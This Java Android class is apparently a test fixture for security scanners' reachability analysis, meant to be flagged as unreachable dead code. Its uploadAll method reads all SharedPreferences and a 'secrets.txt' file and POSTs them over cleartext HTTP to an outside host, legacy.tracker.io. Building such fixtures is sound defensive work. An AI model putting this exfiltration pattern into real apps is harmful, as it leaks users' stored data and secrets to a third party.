package com.test.reachability;

// ORPHANED CLASS - reachability test: should NOT be flagged
//
// Simulated Weaknesses:
//   uploadAll() →
//     M9 (Insecure Data Storage) + M5 (Insecure Communication)
//     MASVS: MASVS-STORAGE (Reading Sensitive Data from Insecure Storage)
//            MASVS-NETWORK-1 (Exfiltration of Secrets via Cleartext HTTP POST)
//     MASTG: MASTG-ANDROID-STORE (Testing Local Storage for Sensitive Data)
//            MASTG-ANDROID-NET (Testing for Cleartext Traffic)

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Environment;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * This class is never instantiated or referenced anywhere in the project.
 * It exists solely to test whether reachability analysis tools correctly
 * identify it as unreachable dead code.
 */
public class LegacyDataUploader {

    @SuppressWarnings("deprecation")
    public void uploadAll(Context ctx) {
        try {
            // Read from SharedPreferences
            SharedPreferences prefs = ctx.getSharedPreferences("app_prefs", Context.MODE_PRIVATE);
            String prefsData = prefs.getAll().toString();

            // Read from external storage
            File file = new File(Environment.getExternalStorageDirectory(), "secrets.txt");
            BufferedReader reader = new BufferedReader(new FileReader(file));
            String fileData = reader.readLine();
            reader.close();

            // Send both via HTTP POST
            String payload = "prefs=" + prefsData + "&file=" + fileData;
            URL url = new URL("http://legacy.tracker.io/upload");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            OutputStream os = connection.getOutputStream();
            os.write(payload.getBytes());
            os.close();
            connection.getResponseCode();
            connection.disconnect();
        } catch (IOException e) {
            Log.e("LegacyUploader", "Upload failed", e);
        }
    }
}
